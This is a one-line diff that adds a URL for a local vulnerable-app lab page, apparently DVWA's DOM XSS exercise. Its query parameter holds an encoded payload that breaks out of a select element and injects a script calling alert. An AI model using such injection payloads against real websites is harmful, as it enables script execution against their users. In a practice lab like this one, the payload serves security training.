@@ -1,0 +1,1 @@
+http://127.0.0.1:4280/vulnerabilities/xss_d/?default=%3C%2Foption%3E%3C%2Fselect%3E%3Cscript%3Ealert%28%27XSS_DOM%27%29%3C%2Fscript%3E
